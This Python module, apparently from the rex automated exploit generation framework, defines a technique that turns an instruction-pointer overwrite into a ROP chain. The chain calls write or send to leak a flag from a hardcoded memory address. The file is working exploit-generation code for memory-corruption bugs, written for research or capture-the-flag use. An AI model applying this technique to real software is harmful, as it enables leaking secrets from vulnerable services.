import angrop.errors
import logging
from rex import Vulnerability
from ..exploit_misc import ExploitLeak
from ..technique import Technique, CannotExploit

l = logging.getLogger("rex.exploit.techniques.rop_leak_memory_cgc")

class RopLeakMemory(Technique):
    name = "leak_memory"

    applicable_to = ['unix']

    def apply(self):
        if not self.rop:
            raise CannotExploit("Need rop")

        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            raise CannotExploit("Cannot control ip")

        # shitty approximation
        try:
            open_fd = next(fd for fd, simfd in self.crash.state.posix.fd.items() if
                           simfd.read_storage.ident.startswith('aeg_stdin') and
                           self.crash.state.solver.eval(simfd.read_storage.pos) > 0)
        except StopIteration:
            raise CannotExploit("Can't find output channel")

        output_pos = self.crash.state.posix.fd[open_fd].write_storage.size

        # INFORMATION PROVIDED BY HUMAN
        flag_addr = 0x602140
        flag_size = 24
        flag_name = "FLAG"

        base_chain = None
        calls = [('write', [open_fd, flag_addr, flag_size]), ('send', [open_fd, flag_addr, flag_size, 0])]
        for func, args in calls:
            try:
                base_chain = self.rop.func_call(func, args)
                break
            except angrop.errors.RopException:
                pass
        else:
            raise CannotExploit("No sending func available")

        chain, chain_addr = self._ip_overwrite_with_chain(base_chain)

        # probably unnecessary
        self.crash.state.solver.add(*chain._blank_state.solver.constraints)

        chain_bv = chain.payload_bv()

        ch_sym_mem = self.crash.state.memory.load(chain_addr, len(chain_bv)//8)
        self.crash.state.add_constraints(ch_sym_mem == chain_bv)

        return ExploitLeak(self.crash, True, True, leaks=[(flag_name, output_pos, flag_size, "bytes", False)])
